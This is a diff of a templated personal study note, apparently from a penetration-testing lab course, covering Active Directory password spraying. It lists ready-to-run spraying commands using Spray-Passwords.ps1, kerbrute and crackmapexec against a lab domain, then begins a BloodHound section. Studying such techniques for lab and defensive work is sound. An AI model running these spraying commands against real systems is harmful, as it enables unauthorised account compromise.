@@ -3,7 +3,7 @@
 const path = tp.file.folder(true).split('/');
 const filename = "2_B_AD_" + path[path.length - 1];
 await tp.file.rename(filename);
-tR += "Part of " + "[" + "[" + "0_Lab_" + path[path.length - 2] + "]]";
+tR += "Part of " + "[" + "[" + "0_Lab_" + path[path.length - 1] + "]]";
 -%>
 
 # Password spraying
@@ -13,7 +13,7 @@ net accounts
 ```
 If not set, we can try to spray AD passwords by two means:
 - `.\Spray-Passwords.ps1 -Pass Nexus123! -Admin` (see `~/Documents/activeInformationGathering`)
-- `kerbrute passwordspray -d corp.com .\usernames.txt "Password"` (cross-platform but requires UDP. Text file must be ANSI, else network error)
+- `kerbrute passwordspray -d corp.com .\users.txt "Password"` (cross-platform but requires UDP. Text file must be ANSI, else network error)
 - `crackmapexec smb $hip -u $user -p '$password' -d corp.com --continue-on-success`
 # BloodHound
 1. **Setup C2 (Kali)**
